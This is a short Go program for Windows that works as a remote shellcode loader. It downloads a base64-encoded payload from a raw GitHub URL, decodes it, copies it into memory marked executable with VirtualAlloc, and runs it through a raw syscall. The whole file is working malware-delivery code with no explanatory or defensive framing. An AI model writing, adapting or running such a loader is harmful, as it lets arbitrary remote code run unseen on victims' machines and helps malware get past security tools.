package main

import (
	"encoding/base64"
	"io/ioutil"
	"net/http"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func get_shellcode(url string) ([]byte, error) {
	resp, _ := http.Get(url)
	defer resp.Body.Close()
	data, _ := ioutil.ReadAll(resp.Body)
	decodedShellcode, _ := base64.StdEncoding.DecodeString(string(data))
	return decodedShellcode, nil
}

func executeShellcode(shellcode []byte) {
	addr, _ := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], shellcode)
	syscall.Syscall(uintptr(addr), 0, 0, 0, 0)
	windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
}

func main() {
	shellcode, _ := get_shellcode("https://raw.githubusercontent.com/nahid0x1/nahid0x1.github.io/refs/heads/main/test/mark1_base64.txt")
	executeShellcode(shellcode)
}
